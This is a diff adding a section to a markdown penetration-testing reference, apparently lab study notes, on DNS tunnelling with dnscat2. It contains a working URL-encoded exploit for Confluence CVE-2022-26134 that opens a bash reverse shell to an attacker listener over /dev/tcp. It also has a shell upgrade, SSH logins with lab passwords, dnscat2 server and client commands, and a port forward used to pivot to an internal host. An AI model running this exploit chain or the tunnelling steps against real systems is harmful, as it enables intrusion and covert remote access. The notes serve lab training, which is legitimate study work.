@@ -3123,8 +3123,40 @@ Reference
     ```
   - The TXT record response from give-me.cat-facts.internal
     `database_admin@pgdatabase01:~$ nslookup -type=txt give-me.cat-facts.internal`
-- DNS tunneling with dnscat2
-  - 
+- DNS tunneling with dnscat2  
+  ```
+  MULTISERVER03  192.168.164.64
+  FELINEAUTHORITY 192.168.164.7
+  PGDATABASE01 10.4.164.215
+  CONFLUENCE01 192.168.164.63
+  HRSHARES 172.16.164.217
+  ```
+  - set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01  
+  - get reserve shell from confluence CVE-2022-26134. change confluence server and kali ip  
+    ```
+    nc -nvlp 4444
+    curl http://192.168.164.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+    ssh database_admin@10.4.164.215 pass: sqlpass123
+    ```
+  - another shell of FELINEAUTHORITY, start dnscat2-server > New window created: 1  
+    `ssh kali@192.168.164.7 pass:7he_C4t_c0ntro11er`
+    `kali@felineauthority:~$ dnscat2-server feline.corp`
+  - move to PGDATABASE01 to run the dnscat2 client binary > Session established!  
+    ```
+    database_admin@pgdatabase01:~$ cd dnscat/
+    database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
+    ``` 
+  - Interacting with the dnscat2 client from the server FELINEAUTHORITY  
+    ```
+    dnscat2> windows
+    dnscat2> window -i 1
+    ```   
+  - Setting up a port forward from FELINEAUTHORITY to PGDATABASE01 (listening on 4647 on the loopback interface of FELINEAUTHORITY, and forwarding to 4646 on HRSHARES)  
+    `command (pgdatabase01) 1> listen 0.0.0.0:4647 172.16.164.217:4646`
+  - Connect to FELINEAUTHORITY via port forward 4647  
+    `./dnscat_exercise_client -i 192.168.164.7 -p 4647`
 
 ## Penetration testing report 
 - note editor:
